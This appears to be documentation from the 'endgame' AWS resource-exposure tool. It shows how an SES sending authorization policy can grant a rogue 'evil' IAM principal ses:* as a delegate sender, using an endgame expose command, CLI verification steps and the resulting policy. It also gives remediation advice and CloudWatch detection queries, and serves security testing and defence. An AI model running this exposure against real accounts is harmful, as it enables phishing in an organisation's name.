# SES Sender Authorization Policies

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

SES Sending Authorization Policies can be used to add a rogue IAM user as a [Delegate sender](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks.html). This can result in a malicous user sending an email on behalf of your organization, which could lead to phishing attacks against customers or employees, as well as a loss of consumer trust and reputation loss.

### How it works

Sending authorization is based on sending authorization policies. If you want to enable a delegate sender to send on your behalf, you create a sending authorization policy and associate the policy to your identity by using the Amazon SES console or the Amazon SES API.

When Amazon SES receives the request to send the email, it checks your identity's policy (if present) to determine if you have authorized **the delegate sender** to send on the identity's behalf. If the delegate sender is authorized, Amazon SES accepts the email.

This can be abused by adding a rogue user as a [Delegate sender](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks.html).

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service ses --name test-resource-exposure.com
```

* To verify that the sender authorization policy has been set to allow actions from the rogue user, run the following command from the victim account:

```bash
aws ses list-identity-policies --identity test-resource-exposure.com
```

The command above will return the following:

```bash
{
    "PolicyNames": [
        "Endgame"
    ]
}
```

* Take the response from the command above - `Endgame` - and list the policy name in the command below

```bash
aws ses get-identity-policies --identity test-resource-exposure.com --policy-names "Endgame"
```

* Observe that the contents match the example shown below

## Example

The policy below allows the Evil Principal (`arn:aws:iam::999988887777:user/evil` access to `ses:*` to the victim resource (`arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com`), indicating a successful compromise.

```json
{
    "Policies": {
        "Endgame": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"ses:*\",\"Resource\":\"arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:user/evil\"},\"Action\":\"ses:*\",\"Resource\":\"arn:aws:ses:us-east-1:111122223333:identity/test-resource-exposure.com\"}]}"
    }
}

```

## Exploitation

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool.

* **Trusted Accounts Only**: Ensure that SES Authorization Policies only authorize specific delegate senders according to your design.
* **Ensure access is necessary**: For any delegate senders that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to manipulation of your SES Sender Authorization Policies**: Tightly control access to the following IAM actions:
      - [ses:PutIdentityPolicy](https://docs.aws.amazon.com/ses/latest/APIReference/API_PutIdentityPolicy.html): _Adds or updates a sending authorization policy for the specified identity (an email address or a domain)_
      - [ses:DeleteIdentityPolicy](https://docs.aws.amazon.com/ses/latest/APIReference/API_DeleteIdentityPolicy.html): _Deletes the policy associated with the identity_
      - [ses:GetIdentityPolicies](https://docs.aws.amazon.com/ses/latest/APIReference/API_GetIdentityPolicies.html): _Returns the requested sending authorization policies for the given identity (an email address or a domain)_
      - [ses:ListIdentities](https://docs.aws.amazon.com/ses/latest/APIReference/API_ListIdentities.html): _Returns a list containing all of the identities (email addresses and domains) for your AWS account, regardless of verification status	_
      - [ses:ListIdentityPolicies](https://docs.aws.amazon.com/ses/latest/APIReference/API_ListIdentityPolicies.html): _Returns a list of sending authorization policies that are attached to the given identity (an email address or a domain)_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='ses.amazonaws.com' AND (eventName='PutIdentityPolicy' or eventName='DeleteIdentityPolicy')
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='ses.amazonaws.com' AND (eventName='PutIdentityPolicy' and requestParameters.policyName='Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [put-identity-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ses/put-identity-policy.html)

* [Sending Authorization Overview](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-overview.html)

* [Sending Authorization Policy Examples](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-policy-examples.html)
* [Delegate sender](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-authorization-delegate-sender-tasks.html)
